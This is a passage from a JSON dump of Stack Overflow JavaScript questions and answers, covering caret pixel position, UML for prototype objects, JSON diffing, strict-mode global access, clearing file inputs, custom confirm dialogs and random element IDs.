                    "body": "<p>Here is a simple mix of ideas from <a href=\"http://stackoverflow.com/questions/13347471/caret-position-in-pixels-in-a-text-field\">Caret position in pixels in a text field</a> , <a href=\"http://stackoverflow.com/questions/263743/how-to-get-caret-position-in-textarea\">How to get caret position in textarea?</a> and <a href=\"http://stackoverflow.com/questions/4069982/document-getelementbyid-vs-jquery\">document.getElementById vs jQuery $()</a> to get the caret position in jQuery for an <code>&lt;input&gt;</code> element. It works when clicking inside it, but not when moving the caret using the arrows or typing.</p>\n\n<pre><code>&lt;input id=\"someid\"&gt;\n&lt;span id=\"faux\" style=\"display:none\"&gt;&lt;/span&gt;&lt;br/&gt;\n\n&lt;script&gt;\nvar inputter = $('#someid')[0];\nvar faux = $('#faux');\n\nfunction getCaret(el) { \n    if (el.selectionStart) { \n        return el.selectionStart; \n    } else if (document.selection) { \n        el.focus(); \n\n        var r = document.selection.createRange(); \n        if (r == null) { \n            return 0; \n        } \n\n        var re = el.createTextRange(), \n            rc = re.duplicate(); \n        re.moveToBookmark(r.getBookmark()); \n        rc.setEndPoint('EndToStart', re); \n\n        return rc.text.length; \n    }  \n    return 0; \n}\n\n$(\"#someid\").click( function( event ) {\n    caretpos = getCaret(inputter);\n    calcfaux = faux.text($(this).val().substring(0, caretpos));\n    fauxpos = calcfaux.outerWidth();\n    $(\"#getpx\").text(fauxpos + \" px\");\n});\n\n&lt;/script&gt;\n</code></pre>\n\n<p>Instead of <code>var inputter = document.getElementById('someid')</code> we use <code>var inputter = $('#someid')[0];</code></p>\n\n<p>Here is a <strong><a href=\"http://jsfiddle.net/YbSxf/32/\" rel=\"nofollow\">FIDDLE</a></strong>.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I was wondering if it is possible to find the exact location of the carret inside a textarea in pixels in relation to the entire page. For instance, if I have typed <code>This is text</code> into my text box, I would like to know the pixes from the top left of the screen to the carot.</p>\n\n<p>It would be in the form X: 200 Y: 100. This is so I can position a floating div. This needs to be done dynamically in <strong>javascript</strong>.</p>\n\n<p>Thanks guys</p>\n",
            "last_activity_date": 1395064778,
            "question_id": 9012835,
            "score": 7,
            "tags": [
                "javascript",
                "html",
                "cursor",
                "textarea",
                "position"
            ],
            "title": "Find caret position in textarea in pixels"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>It looks like you are trying to show the relationship between object instances in a class diagram. This will not really work; you probably want to try using a UML instance diagram (may also be called an object diagram). A class diagram is meant to capture system concepts, their structure and their relationships in a static way. It may help to start with a class diagram and then move to an instance diagram where you can plug some values in the \"slots\" or properties of you object instances to see if the model in your class diagram works.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>First thing you need to know is that JavaScript uses <a href=\"http://en.wikipedia.org/wiki/Prototype-based\">prototype-based inheritance</a>. This means there is no distinction between classes and instances as in other OO languages (like Java). There are just objects. One implication of that is that differentiating between <a href=\"http://en.wikipedia.org/wiki/Class_diagram\">class</a> and <a href=\"http://en.wikipedia.org/wiki/Object_diagram\">object diagrams</a> does not make sense.</p>\n\n<p>To your first example:</p>\n\n<pre><code>var a, b;\n\na = {};\nb = Object.create(a);\n</code></pre>\n\n<p>This is inheritance - object <code>b</code> inherits properties of object <code>a</code>.</p>\n\n<p>Correct way to model this in UML is this class/object diagram:</p>\n\n<p><img src=\"http://i.stack.imgur.com/X6tkf.png\" alt=\"object b inherits from object a\"></p>\n\n<p>Mixins can be viewed as a form of multiple inheritance, object <code>c</code> is inheriting properties from object <code>a</code> and <code>b</code>, diagram for that might look like this:</p>\n\n<p><img src=\"http://i.stack.imgur.com/QGAdq.png\" alt=\"object c inherits from a and b\"></p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>Your examples are representing relationships between objects, not classes, so the UML object diagram is the way to go (as RobertMS has pointed out already).</p>\n\n<p>The objects are related to each other in the sense that (in the first case) object <code>a</code> is the <em>prototype</em> of object <code>b</code>.  I would use a dependency relationship for this.  Wikipedia has a good description of the UML dependency notation <a href=\"http://en.wikipedia.org/wiki/Dependency_%28UML%29\" rel=\"nofollow\">here</a>.</p>\n\n<p>The rationale for using a dependency is that it reflects the notion that \"a change to the influent or independent modeling element may affect the semantics of the dependent modeling element.\"  Since we often use prototype objects to hold default properties, as well as methods, for a collection of \"dependent\" objects (i.e., objects of the same \"class\"), this use of dependency seems justifiable, if not maybe a little controversial.</p>\n\n<p>I would label the dependency with the stereotype \"&lt;&lt;proto>>\".</p>\n\n<p>UML does give you a lot of flexibility, though it is nice to follow convention.</p>\n\n<p>There is a good treatment of object diagrams on <a href=\"http://www.agilemodeling.com/artifacts/objectDiagram.htm\" rel=\"nofollow\">this page by Scott Ambler</a>.</p>\n\n<p>In your second example, using jQuery's <code>extend</code> function, you don't have a true prototype relationship, but you are merging properties from some objects into another object.  In this case, I'm not sure that there is a specific overarching modeling term for this.  There is a kind of dependency here, though.  I would suggest looking through the list of standard UML dependency stereotypes (listed on the above-mentioned Wikipedia page) and see if anything makes sense in your specific application.  Perhaps &lt;&lt;refine>> works for you? </p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I'm looking for a way of graphically representing javascript objects...</p>\n\n<p>I know there is UML, but for example, how to represent the <strong>chain</strong> between 2 objects, eg:</p>\n\n<pre><code>var a, b;\n\na = {};\nb = Object.create(a);\n</code></pre>\n\n<p>Intuitively, I'd draw something like this:</p>\n\n<pre><code>+-----+\n|b    |\n|-----|\n|     |\n+--+--+\n   |     +-----+\n   +----&gt;|a    |\n         |-----|\n         |     |\n         +-----+\n</code></pre>\n\n<p>but is there a decent representation in UML?</p>\n\n<p>And what about <strong>mixins</strong>?</p>\n\n<pre><code>c = $.extend({}, a, b)\n\n+-----+           +-----+\n|a    |           |b    |\n|-----|           |-----|\n|     |&lt;----------|     |\n+-----+           +-----+\n   +     +-----+\n   |     |c    |\n   |     |-----|\n   +----&gt;|     |\n         +-----+\n</code></pre>\n",
            "last_activity_date": 1383746924,
            "question_id": 8918677,
            "score": 7,
            "tags": [
                "javascript",
                "uml",
                "object-diagram"
            ],
            "title": "UML for javascript?"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p><a href=\"http://documentcloud.github.com/underscore/#isEqual\" rel=\"nofollow\">http://documentcloud.github.com/underscore/#isEqual</a></p>\n",
                    "is_accepted": false,
                    "score": -1
                },
                {
                    "body": "<p>One potential solution could be to use jQuery's extend. As long as the objects have the same properties, that would work out nicely.</p>\n\n<pre><code>var newJSON = $.extend({},oldJSON,serverData);\n</code></pre>\n\n<p>Then you would have preserved the old object, and created a new object with any properties from the old object if they aren't present in the new object and overwritten any existing properties with the properties from the new data from the server.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<blockquote>\n  <p>What I want to do is take the object that was just polled and compare it to a stored one. Where if there is any changes from one to the other apply them to the stored object <strong>or replace it (either way)</strong></p>\n</blockquote>\n\n<p>If you would be happy with a really simple \"Has it changed in any way? Yes/No\" solution, where if it has changed you just replace the previous object with the new one (as per the part of your question that I quoted), then you could save the JSON response <em>before</em> you parse it, i.e., save it in the <em>string</em> format in which your web-server sends it. Then when the next response comes in compare the new string with the old string. If they are different (or if it is the first request) parse the JSON and process it for display as appropriate. Naturally this assumes that your server-side code is creating the JSON strings in a consistent format (and not, e.g., changing the order of the properties).</p>\n\n<p>If we assume you've already got (parsed) objects, an <code>isEqual(a,b)</code> function really should cope with nested objects, properties that are arrays, etc. This can be done recursively, and simply return true or false, but a <code>getDifferences(a,b)</code> function is going to get confusing in how it reports the differences within nested objects. Consider this simple example:</p>\n\n<pre><code>old: {\"mum\" : \"Maria\", \"dad\" : \"Pierre\", \"kids\" : [\"Joe\", \"Mike\", \"Louisa\"] }\nnew: {\"mum\" : \"Julie\", \"dad\" : \"Pierre\", \"kids\" : [\"Joe\", \"Mary\"] }\n</code></pre>\n\n<p>Is the difference <code>{\"mum\" : \"Julie\", \"kids\" : [\"Mary\"]}</code>? The \"mum\" has changed, and the list of \"kids\" has changed, but has \"Mike\" changed to \"Mary\", or are both \"Mike\" and \"Louisa\" gone with \"Mary\" being new, or...? Maybe it should be <code>\"kids\": [\"Joe\",\"Mary\"]</code> because that's the new value. How do you indicate the deletions? That's just the first example off the top of my head where I don't know how you would want to handle the differences. It could quickly get worse: what if the \"kids\" array contained objects instead of strings to represent a whole family tree? What if the new \"mum\" property was <code>[\"Maria\", \"Julie\"]</code> (to allow for step-parents and so forth)?</p>\n\n<p>If for your particular data you know you've only got one-dimensional objects then you can do something simple like the following:</p>\n\n<pre><code>function getDifferences(oldObj, newObj) {\n   var diff = {};\n\n   for (var k in oldObj) {\n      if (!(k in newObj))\n         diff[k] = undefined;  // property gone so explicitly set it undefined\n      else if (oldObj[k] !== newObj[k])\n         diff[k] = newObj[k];  // property in both but has changed\n   }\n\n   for (k in newObj) {\n      if (!(k in oldObj))\n         diff[k] = newObj[k]; // property is new\n   }\n\n   return diff;\n}\n</code></pre>\n\n<p>The simplest change to the above to allow for nested objects is to just assume that if a property is an object/array then you only care whether it is different in any way and not dig down to report exactly which \"sub-properties\" have changed. If so, simply take the above function and change:</p>\n\n<pre><code>else if (oldObj[k] !== newObj[k])\n</code></pre>\n\n<p>to</p>\n\n<pre><code>else if (!isEqual(oldObj[k],newObj[k]))\n</code></pre>\n\n<p>Where <code>isEqual()</code> is one of the many comparison functions floating around the web or <a href=\"http://stackoverflow.com/questions/201183/how-do-you-determine-equality-for-two-javascript-objects\">on StackOverflow</a>.</p>\n\n<p>(Note: I haven't bothered with <code>.hasOwnProperty()</code> above because I assume that objects that were returned to an Ajax request as JSON will not be inheriting properties from a prototype chain. Similarly an <code>isEqual()</code> function for this purpose wouldn't need to worry about properties being functions, it only needs to worry about what is valid in a JSON string.)</p>\n",
                    "is_accepted": true,
                    "score": 8
                },
                {
                    "body": "<pre><code>var objectsAreEqual = function(obj1, x){\n  var MAX_DEPTH = 10;\n  var testEq = function(obj1, x, depth){\n    if(depth &lt; MAX_DEPTH){\n      for (var p in obj1) {\n          if(typeof(obj1[p]) !== typeof(x[p])) return false;\n          if((obj1[p]===null) !== (x[p]===null)) return false;\n          switch (typeof(obj1[p])) {\n              case 'undefined':\n                  if (typeof(x[p]) != 'undefined') return false;\n                  break;\n              case 'object':\n                  if(obj1[p]!==null &amp;&amp; x[p]!==null &amp;&amp; (obj1[p].constructor.toString() !== x[p].constructor.toString() || !testEq(obj1[p], x[p], depth + 1))) return false;\n                  break;\n              case 'function':\n                  if (p != 'equals' &amp;&amp; obj1[p].toString() != x[p].toString()) return false;\n                  break;\n              default:\n                  if (obj1[p] !== x[p]) return false;\n          }\n      }\n    }\n    return true;\n  };\n  // this is a little ugly, but the algorithm above fails the following: testEq([[1,2],[]], [[1,2],[1,3]], 0)\n  return testEq(obj1, x, 0) &amp;&amp; testEq(x, obj1, 0); \n\n};\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Sorry to answer old thread but my answer may help others who may face the same issue.the most easiest &amp; shortest code to compare two json object as follows. thanks</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n    $(document).ready(function () {\n        var a = { \"id\": \"210\", \"memberlist\": \"john\" };\n        var b = { \"id\": \"210\", \"memberlist\": \"john1\" };\n\n        alert(JSON.stringify(a) != JSON.stringify(b) ? 'not same' : ' same');\n    });\n&lt;/script&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Is it possible to compare 2 sets of json objects for a difference? What I have is a script thats polling for JSON object via jquery $post(). What I want to do is take the object that was just polled and compare it to a stored one. Where if there is any changes from one to the other apply them to the stored object or replace it (either way) but from the UI perspective I am working with seamlessly apply the changes to what the JSON object is for by finding the differences between the 2. I want to do this because right now I have it so the UI is completely reloading per poll regardless of change or not which basically looks like <em>*</em>* from a UX perspective. </p>\n\n<p>I figure if I can find the differences if any between the 2 objects I would fire off a function that I would have edit the UI specific to the differences.</p>\n",
            "last_activity_date": 1424342982,
            "question_id": 8108666,
            "score": 7,
            "tags": [
                "javascript",
                "jquery",
                "json"
            ],
            "title": "jQuery/JavaScript JSON object comparison"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<h2>Access to the Global Object (before ES5)</h2>\n\n<blockquote>\n  <p>If you need to access the global object without hard-coding the identifier window, you can do the following from any level of nested function scope:</p>\n</blockquote>\n\n<pre><code>var global = (function () {\n    return this;\n}());\n</code></pre>\n\n<blockquote>\n  <p>This way you can always get the global object, because inside functions that were invoked\n  as functions (that is, not as constrictors with new) this should always point to\n  the global object. </p>\n</blockquote>\n\n<p><b>This is actually no longer the case in ECMAScript 5 in strict mode,\nso you have to adopt a different pattern when your code is in strict mode.</b></p>\n\n<blockquote>\n  <p>For example,\n  if you\u2019re developing a library, you can wrap your library code in an immediate function\n  (discussed in Chapter 4) and then from the global scope, pass a reference to this as a\n  parameter to your immediate function.</p>\n</blockquote>\n\n<h2>Access to the Global Object (after ES5)</h2>\n\n<blockquote>\n  <p>Commonly, the global object is passed as an argument to the immediate function so\n  that it\u2019s accessible inside of the function without having to use window: this way makes\n  the code more interoperable in environments outside the browser:</p>\n</blockquote>\n\n<pre><code>(function (global) {\n    // access the global object via `global`\n}(this));\n</code></pre>\n\n<p><em>\u201cJavaScript Patterns, by Stoyan Stefanov\n(O\u2019Reilly). Copyright 2010 Yahoo!, Inc., 9780596806750.\u201d</em></p>\n",
                    "is_accepted": true,
                    "score": 8
                },
                {
                    "body": "<h1>Solution:</h1>\n\n<pre><code>var global = Function('return this')();\n</code></pre>\n\n<p>Works in all Browsers, Engines, ES3, ES5, strict, nested scope, etc.</p>\n\n<p>A slight variation will pass JSLINT:</p>\n\n<pre><code>var FN = Function, global = FN('return this')();\n</code></pre>\n\n<h2>Discussion</h2>\n\n<p>See <a href=\"http://stackoverflow.com/questions/3277182/how-to-get-the-global-object-in-javascript\">How to get the Global Object in JavaScript?</a></p>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<p>Here's a snippet from <a href=\"http://perfectionkills.com/global-eval-what-are-the-options/\" rel=\"nofollow\">Perfection Kills</a>, using global eval.</p>\n\n<pre><code>var root = (function () {\n    return this || (0 || eval)('this');\n}());\n</code></pre>\n\n<p>ECMA3, ECMA5, Strict mode, etc compatible, passes JSLint.</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>So I saw a function that was, quite frankly beautiful in its simplicity as it allowed you to find the global object ( which depending on environ at the time may NOT have been window ) while within an anonymous function; however when you throw javascripts' \"use strict\"; mode it crumbles, due to the evaluation of the keyword 'this' changing. There were a few ways to accomplish this?</p>\n\n<pre><code>(function () {\n    var win = function () {\n        return (function () {\n                return this;\n            }());\n        };\n    //win now points to the global object no matter where it is called.\n}());\n</code></pre>\n\n<p>Now, if these are called within the context of \"use strict\" we lose the functionality described, is there any equivalent that can be done in ES5 strict mode?</p>\n\n<p>For reference</p>\n\n<pre><code>(function () {\n    \"use strict\"\n    //code here is in strict mode\n}())\n</code></pre>\n",
            "last_activity_date": 1369571689,
            "question_id": 7290086,
            "score": 7,
            "tags": [
                "javascript",
                "ecmascript-5"
            ],
            "title": "javascript &quot;use strict&quot; and Nick&#39;s find global function"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>Use the old-fashioned <code>&lt;input type=\"reset\" value=\"clear this\"&gt;</code></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>It's readonly in <a href=\"http://blogs.msdn.com/b/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx\">IE8 onwards</a>, so you can't clear it. The simplest way around this security feature is to replace the element with a copy.</p>\n\n<p><strong>Edit</strong> Found a previous answer to this that suggests the same approach! <a href=\"http://stackoverflow.com/questions/1043957/clearing-input-type-file-using-jquery/1043969#1043969\">Clearing &lt;input type=&#39;file&#39; /&gt; using jQuery</a></p>\n",
                    "is_accepted": true,
                    "score": 8
                },
                {
                    "body": "<p>use simple javascript:</p>\n\n<pre><code>formname.reset();\n</code></pre>\n\n<p>See the Demo: <a href=\"http://jsfiddle.net/rathoreahsan/YEeGR/\" rel=\"nofollow\">http://jsfiddle.net/rathoreahsan/YEeGR/</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>One solution I've found is simply doing:</p>\n\n<pre>\ndocument.getElementById('myUploadField').parentNode.innerHTML = document.getElementById('myUploadField').parentNode.innerHTML;\n</pre>\n\n<p>Seems like it shouldn't work, but it does.</p>\n",
                    "is_accepted": false,
                    "score": 14
                },
                {
                    "body": "<p>Try to use the below method to clear the input file.</p>\n\n<h2>Include this script:</h2>\n\n<pre><code> &lt;script&gt;\n function clearFileInputField(tagId) {\n document.getElementById(tagId).innerHTML =\n    document.getElementById(tagId).innerHTML;\n}\n&lt;/script&gt;\n</code></pre>\n\n<h2>Change HTML to this:</h2>\n\n<pre><code>&lt;div id=\"uploadFile_div\"&gt;\n&lt;input type=\"file\" class=\"fieldMoz\" id=\"uploadFile\" onkeydown=\"return false;\" size=\"40\" name=\"uploadFile\"/&gt;\n&lt;/div&gt;\n&lt;a onclick=\"clearFileInputField('uploadFile_div')\" href=\"javascript:noAction();\"&gt;Clear&lt;/a&gt;`\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>This solution is more elegant than cloning the input element. You wrap a <code>&lt;form&gt;</code> around the element, call reset on the form, then remove the form using unwrap(). Unlike the clone() solutions above, you end up with the same element at the end (including custom properties that were set on it).</p>\n\n<p>Tested and working in Opera, Firefox, Safari, Chrome and IE6+. Also works on other types of form elements, with the exception of type=\"hidden\".</p>\n\n<p><a href=\"http://jsfiddle.net/rPaZQ/\">http://jsfiddle.net/rPaZQ/</a></p>\n\n<pre><code>function reset(e) {\n  e.wrap('&lt;form&gt;').closest('form').get(0).reset();\n  e.unwrap();\n}\u200b\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 8
                }
            ],
            "body": "<p>I have an file upload box and a clear button on my page. When I press the clear button, I want the text in the file upload box to be cleared.</p>\n\n<p>The following works in Firefox, but doesn't in IE (the text stays there). Is there a workaround for this?</p>\n\n<pre><code>$(\"#clear\").click( function() {\n    $(\"#attachment\").val(\"\");\n    //document.myform.attachment.value = \"\";\n})\n</code></pre>\n\n<p>HTML:</p>\n\n<pre><code>&lt;form name=\"myform\"&gt;\n    &lt;input type=\"file\" name=\"attachment\" id=\"attachment\" /&gt;\n&lt;/form&gt;\n&lt;br /&gt;&lt;button id=\"clear\"&gt;Clear Attachment&lt;/button&gt;\n</code></pre>\n\n<p><a href=\"http://jsfiddle.net/VnU4q/\">jsFiddle</a></p>\n",
            "last_activity_date": 1359476257,
            "question_id": 6987452,
            "score": 7,
            "tags": [
                "javascript",
                "jquery",
                "html",
                "internet-explorer",
                "file-upload"
            ],
            "title": "Clearing file input box in Internet Explorer"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>I would use the example given on jQuery UI's site as a template:</p>\n\n<pre><code>$( \"#modal_dialog\" ).dialog({\n    resizable: false,\n    height:140,\n    modal: true,\n    buttons: {\n                \"Yes\": function() {\n                    $( this ).dialog( \"close\" );\n                 },\n                 \"No\": function() {\n                    $( this ).dialog( \"close\" );\n                 }\n             }\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>You might want to consider abstracting it out into a function like this:</p>\n\n<pre><code>function dialog(message, yesCallback, noCallback) {\n    $('.title').html(message);\n    var dialog = $('#modal_dialog').dialog();\n\n    $('#btnYes').click(function() {\n        dialog.dialog('close');\n        yesCallback();\n    });\n    $('#btnNo').click(function() {\n        dialog.dialog('close');\n        noCallback();\n    });\n}\n</code></pre>\n\n<p>You can then use it like this:</p>\n\n<pre><code>dialog('Are you sure you want to do this?',\n    function() {\n        // Do something\n    },\n    function() {\n        // Do something else\n    }\n);\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 14
                },
                {
                    "body": "<p>One other way would be using colorbox</p>\n\n<pre><code>function createConfirm(message, okHandler) {\n    var confirm = '&lt;p id=\"confirmMessage\"&gt;'+message+'&lt;/p&gt;&lt;div class=\"clearfix dropbig\"&gt;'+\n            '&lt;input type=\"button\" id=\"confirmYes\" class=\"alignleft ui-button ui-widget ui-state-default\" value=\"Yes\" /&gt;' +\n            '&lt;input type=\"button\" id=\"confirmNo\" class=\"ui-button ui-widget ui-state-default\" value=\"No\" /&gt;&lt;/div&gt;';\n\n    $.fn.colorbox({html:confirm, \n        onComplete: function(){\n            $(\"#confirmYes\").click(function(){\n                okHandler();\n                $.fn.colorbox.close();\n            });\n            $(\"#confirmNo\").click(function(){\n                $.fn.colorbox.close();\n            });\n    }});\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I've been working on an ASP.net project that uses custom 'modal dialogs'.  I use scare quotes here because I understand that the 'modal dialog' is simply a div in my html document that is set to appear \"on top\" of the rest of the document and is not a modal dialog in the true sense of the word.</p>\n\n<p>In many parts of the web site, I have code that looks like this:</p>\n\n<pre><code>var warning = 'Are you sure you want to do this?';\nif (confirm(warning)) {\n    // Do something\n}\nelse {\n    // Do something else\n}\n</code></pre>\n\n<p>This is okay, but it would be nice to make the confirm dialog match the style of the rest of the page.</p>\n\n<p>However, since it is not a true modal dialog, I think that I need to write something like this: (I use jQuery-UI in this example)</p>\n\n<pre><code>&lt;div id='modal_dialog'&gt;\n    &lt;div class='title'&gt;\n    &lt;/div&gt;\n    &lt;input type='button' value='yes' id='btnYes' /&gt;\n    &lt;input type='button' value='no' id='btnNo' /&gt;\n&lt;/div&gt;\n\n&lt;script&gt;\nfunction DoSomethingDangerous() {\n    var warning = 'Are you sure you want to do this?';\n    $('.title').html(warning);\n    var dialog = $('#modal_dialog').dialog();\n    function Yes() {\n        dialog.dialog('close');\n        // Do something\n    }   \n    function No() {\n        dialog.dialog('close');\n        // Do something else\n    }    \n    $('#btnYes').click(Yes);\n    $('#btnNo').click(No);\n}\n</code></pre>\n\n<p></p>\n\n<p>Is this a good way to accomplish what I want, or is there a better way?</p>\n",
            "last_activity_date": 1359123220,
            "question_id": 6929416,
            "score": 7,
            "tags": [
                "javascript",
                "jquery",
                "jquery-ui",
                "dialog",
                "modal-dialog"
            ],
            "title": "Custom &quot;confirm&quot; dialog in JavaScript?"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>I really like this function:</p>\n\n<pre><code>function guidGenerator() {\n    var S4 = function() {\n       return (((1+Math.random())*0x10000)|0).toString(16).substring(1);\n    };\n    return (S4()+S4()+\"-\"+S4()+\"-\"+S4()+\"-\"+S4()+\"-\"+S4()+S4()+S4());\n}\n</code></pre>\n\n<p>From <a href=\"http://stackoverflow.com/questions/105034/how-to-create-a-guid-uuid-in-javascript\">How to create a GUID / UUID in Javascript?</a></p>\n",
                    "is_accepted": false,
                    "score": 20
                },
                {
                    "body": "<p>Not sure what your problem is, but a way simpler way to create a unique ID in JavaScript is to use the Date object:</p>\n\n<pre><code>var uniqid = Date.now();\n</code></pre>\n\n<p>That gives you the total milliseconds elapsed since January 1st 1970, which is a unique value every time you call that.</p>\n\n<p>The problem with that value now is that you cannot use it as an element's ID, since in HTML, IDs need to start with an alphabetical character. There is also the problem that two users doing an action at the exact same time might result in the same ID. We could lessen the probability of that, and fix our alphabetical character problem, by appending a random letter before the numerical part of the ID.</p>\n\n<pre><code>var randLetter = String.fromCharCode(65 + Math.floor(Math.random() * 26));\nvar uniqid = randLetter + Date.now();\n</code></pre>\n\n<p>This still has a chance, however slim, of colliding though. Your best bet for a unique id is to keep a running count, increment it every time, and do all that in a single place, ie, on the server.</p>\n",
                    "is_accepted": false,
                    "score": 26
                },
                {
                    "body": "<p>First. Assign an id to your div. Like this:</p>\n\n<pre><code>&lt;div id=\"uniqueid\"&gt;This text will be replaced&lt;/div&gt;\n</code></pre>\n\n<p>After that, add inside your <code>&lt;script&gt;</code> tag following code:</p>\n\n<pre><code>Document.getElementById(\"uniqueid\").id = randomString(8);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I would suggest that you start with some sort of placeholder, you may have this already, but its somewhere to append the div.</p>\n\n<pre><code>&lt;div id=\"placeholder\"&gt;&lt;/div&gt;\n</code></pre>\n\n<p>Now, the idea is to dynamically create a new div, with your random id:</p>\n\n<pre><code>var rndId = randomString(8); \nvar div = document.createElement('div');\ndiv.id = rndId\ndiv.innerHTML = \"Whatever you want the content of your div to be\";\n</code></pre>\n\n<p>this can be apended to your placeholder as follows:</p>\n\n<pre><code>document.getElementById('placeholder').appendChild(div);\n</code></pre>\n\n<p>You can then use that in your jwplayer code:</p>\n\n<pre><code>jwplayer(rndId).setup(...);\n</code></pre>\n\n<p>Live example: <a href=\"http://jsfiddle.net/pNYZp/\" rel=\"nofollow\">http://jsfiddle.net/pNYZp/</a></p>\n\n<p>Sidenote: Im pretty sure id's must start with an alpha character  (ie, no numbers) - you might want to change your implementation of randomstring to enforce this rule. (<a href=\"http://www.w3.org/TR/html4/types.html#type-name\" rel=\"nofollow\">ref</a>)</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I think some folks here haven't really focused on your particular question.  It looks like the problem you have is in putting the random number in the page and hooking the player up to it.  There are a number of ways to do that.  The simplest is with a small change to your existing code like this to document.write() the result into the page.  I wouldn't normally recommend document.write(), but since your code is already inline and what you were trying do already was to put the div inline, this is the simplest way to do that.  At the point where you have the random number, you just use this to put it and the div into the page:</p>\n\n<pre><code>var randomId = \"x\" + randomString(8);\ndocument.write('&lt;div id=\"' + randomId + '\"&gt;This text will be replaced&lt;/div&gt;');\n</code></pre>\n\n<p>and then, you refer to that in the jwplayer set up code like this:</p>\n\n<pre><code>jwplayer(randomId).setup({\n</code></pre>\n\n<p>And the whole block of code would look like this:</p>\n\n<pre><code>&lt;script type='text/javascript' src='jwplayer.js'&gt;&lt;/script&gt;\n&lt;script type='text/javascript'&gt;\nfunction randomString(length) {\n    var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz'.split('');\n\n    if (! length) {\n        length = Math.floor(Math.random() * chars.length);\n    }\n\n    var str = '';\n    for (var i = 0; i &lt; length; i++) {\n        str += chars[Math.floor(Math.random() * chars.length)];\n    }\n    return str;\n}\n\nvar randomId = \"x\" + randomString(8);\ndocument.write('&lt;div id=\"' + randomId + '\"&gt;This text will be replaced&lt;/div&gt;'); \n\n  jwplayer(randomId).setup({\n    'flashplayer': 'player.swf',\n    'file': 'http://www.youtube.com/watch?v=4AX0bi9GXXY',\n    'controlbar': 'bottom',\n    'width': '470',\n    'height': '320'\n  });\n&lt;/script&gt;\n</code></pre>\n\n<hr>\n\n<h2>Another way to do it</h2>\n\n<p>I might add here at the end that generating a truly random number just to create a unique div ID is way overkill.  You don't need a random number.  You just need an ID that won't otherwise exist in the page.  Frameworks like YUI have such a function and all they do is have a global variable that gets incremented each time the function is called and then combine that with a unique base string.  It can look something like this:</p>\n\n<pre><code>var generateID = (function() {\n    var globalIdCounter = 0;\n    return function(baseStr) {\n        return(baseStr + globalIdCounter++);\n    }\n})();\n</code></pre>\n\n<p>And, then in practical use, you would do something like this:</p>\n\n<pre><code>var randomId = generateID(\"myMovieContainer\");  // \"myMovieContainer1\"\ndocument.write('&lt;div id=\"' + randomId + '\"&gt;This text will be replaced&lt;/div&gt;');\njwplayer(randomId).setup({\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>A edited version of @jfriend000 version:</p>\n\n<pre><code>    /**\n     * Generates a random string\n     * \n     * @param int length_\n     * @return string\n     */\n    function randomString(length_) {\n\n        var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz'.split('');\n        if (typeof length_ !== \"number\") {\n            length_ = Math.floor(Math.random() * chars.length_);\n        }\n        var str = '';\n        for (var i = 0; i &lt; length_; i++) {\n            str += chars[Math.floor(Math.random() * chars.length)];\n        }\n        return str;\n    }\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>i want to display youtube videos on my website but i need to be able to add a unique id for each video thats going to be shared by users. so i put this together and i have run into a little problem. i am trying to get the javascript to add a random string for the div id but its not working showing the string</p>\n\n<pre><code>&lt;script type='text/javascript' src='jwplayer.js'&gt;&lt;/script&gt;\n&lt;script type='text/javascript'&gt;\nfunction randomString(length) {\n    var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz'.split('');\n\n    if (! length) {\n        length = Math.floor(Math.random() * chars.length);\n    }\n\n    var str = '';\n    for (var i = 0; i &lt; length; i++) {\n        str += chars[Math.floor(Math.random() * chars.length)];\n    }\n    return str;\n}\n\nvar div = randomString(8);\n&lt;/script&gt;\n\n&lt;div id='div()'&gt;This text will be replaced&lt;/div&gt;\n\n&lt;script type='text/javascript'&gt;\n  jwplayer('div()').setup({\n    'flashplayer': 'player.swf',\n    'file': 'http://www.youtube.com/watch?v=4AX0bi9GXXY',\n    'controlbar': 'bottom',\n    'width': '470',\n    'height': '320'\n  });\n&lt;/script&gt;\n</code></pre>\n",
            "last_activity_date": 1424389106,
            "question_id": 6860853,
            "score": 7,
            "tags": [
                "javascript"
            ],
            "title": "generate random string for div id"
        },
        {
            "answer_count": 8,
            "answers": [
                {
